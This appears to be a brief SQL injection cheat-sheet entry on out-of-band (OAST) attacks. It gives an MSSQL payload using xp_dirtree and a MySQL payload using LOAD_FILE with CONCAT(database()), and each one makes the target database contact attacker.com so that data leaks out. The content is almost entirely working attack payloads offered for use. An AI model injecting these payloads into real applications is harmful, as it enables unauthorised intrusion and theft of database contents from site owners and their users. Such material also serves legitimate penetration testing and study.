E. OUT-OF-BAND (OAST) SQLi
🔍 Idea:
Server sends data to your external server
Payload:
'; exec xp_dirtree '\\attacker.com\abc'--
OR MySQL:
LOAD_FILE(CONCAT('\\\\attacker.com\\',database()))
